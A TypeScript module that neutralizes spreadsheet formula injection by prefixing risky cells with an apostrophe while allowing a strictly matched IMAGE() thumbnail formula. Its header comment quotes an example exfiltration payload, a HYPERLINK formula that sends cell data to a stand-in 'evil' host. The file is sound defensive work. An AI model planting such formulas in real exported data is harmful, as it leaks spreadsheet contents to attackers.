/**
 * Formula-injection defense for spreadsheet sinks (audit item C-4).
 *
 * Google Sheets, Excel, and LibreOffice treat a cell whose text begins with
 * `=`, `+`, `-`, `@`, or a leading TAB/CR/LF as a *formula*. An attacker who
 * gets `=HYPERLINK("http://evil/?"&A1)` or `=IMPORTXML(...)` into any exported
 * or synced cell can exfiltrate other cells, phish the viewer, or trigger a
 * DDE payload in desktop Excel. This is CWE-1236 (Improper Neutralization of
 * Formula Elements in a CSV File) and applies equally to the Sheets API when
 * `valueInputOption: 'USER_ENTERED'` is used.
 *
 * Neutralization strategy (OWASP): prefix any offending cell with a single
 * apostrophe. In Sheets/Excel a leading `'` forces the cell to literal text and
 * is not displayed, so the value round-trips visually while never evaluating.
 *
 * The one legitimate formula in this platform is the monitor-generated
 * `=IMAGE("…")` thumbnail in the `imageFormula` column. `sanitizeSheetCell`
 * accepts an `allowImageFormula` flag that lets a *strictly-shaped* IMAGE()
 * call pass through untouched while still neutralizing anything else (including
 * a spoofed `=IMAGE(...)+HYPERLINK(...)` payload).
 */

/** Characters that make a spreadsheet treat cell text as a formula. */
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r', '\n']);

/**
 * A genuine monitor thumbnail formula: `=IMAGE("https://…")` with an optional
 * numeric mode/size arg. Deliberately strict — no nested commas beyond the
 * documented signature, no trailing operators — so a crafted value that merely
 * starts with `=IMAGE(` cannot smuggle a second expression through.
 */
const SAFE_IMAGE_FORMULA = /^=IMAGE\("https?:\/\/[^"]+"(,\s*\d+(,\s*\d+,\s*\d+)?)?\)$/i;

/**
 * A bare signed numeric literal (`-12`, `+3.5`). These begin with a trigger
 * character but are provably inert — a spreadsheet parses them as numbers, and
 * a DDE/formula payload requires non-numeric text after the sign. Leaving them
 * unprefixed preserves numeric sorting for fields like `sslDaysRemaining`,
 * which is negative once a certificate has expired.
 */
const SIGNED_NUMERIC = /^[+-]\d+(\.\d+)?$/;

/** Options for {@link sanitizeSheetCell}. */
export interface SanitizeOptions {
  /** When true, a strictly-shaped `=IMAGE("…")` value is allowed through. */
  allowImageFormula?: boolean;
}

/**
 * Neutralize a single cell value against formula injection.
 *
 * Non-string inputs (numbers, booleans, null/undefined) are returned unchanged
 * — only text can carry a formula. Strings that begin with a formula trigger
 * are prefixed with `'` unless they are a whitelisted IMAGE() formula.
 */
export function sanitizeSheetCell(value: unknown, opts: SanitizeOptions = {}): unknown {
  if (typeof value !== 'string' || value.length === 0) return value;
  if (opts.allowImageFormula && SAFE_IMAGE_FORMULA.test(value)) return value;
  if (FORMULA_TRIGGERS.has(value[0]!)) {
    if (SIGNED_NUMERIC.test(value)) return value;
    return `'${value}`;
  }
  return value;
}

/**
 * Sanitize an entire row of cell values. `imageColumnIndex`, when provided,
 * marks the single column permitted to hold a genuine `=IMAGE("…")` formula.
 */
export function sanitizeSheetRow(
  row: readonly unknown[],
  imageColumnIndex?: number,
): unknown[] {
  return row.map((cell, i) =>
    sanitizeSheetCell(cell, { allowImageFormula: i === imageColumnIndex }),
  );
}
